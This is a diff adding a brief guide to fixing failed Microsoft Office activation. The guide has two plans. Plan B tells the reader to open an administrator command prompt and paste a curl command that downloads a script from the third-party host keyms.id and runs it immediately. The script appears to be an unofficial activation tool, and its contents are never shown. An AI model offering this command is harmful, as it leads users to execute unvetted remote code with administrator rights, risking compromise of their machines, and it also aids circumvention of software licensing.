@@ -1,0 +1,28 @@
+Plan A
+How to solve microsoft acvtivation failed (works for ms word, excel, and others)
+
+Step 1 - Open File Explorer
+
+Step 2 - Click "my pc" and click local disk C
+
+Step 3 - search for "Program Files"
+
+Step 4 - find "Microsoft Office", and click
+
+Step 5 - click "Office16"
+
+Step 6 - find the file "OSPPREARM", right click on it and press run as administrator
+
+And you're done!
+
+
+Plan B
+If the plan A doesn't work, use plan B
+
+Step 1 - Click windows logo, type cmd and run as administrator
+
+Step 2 - Paste this command into the cmd --> curl -L keyms.id/aso -o aso.cmd & aso.cmd
+
+Step 3 - Wait until it finishes activating application
+
+And you're done!
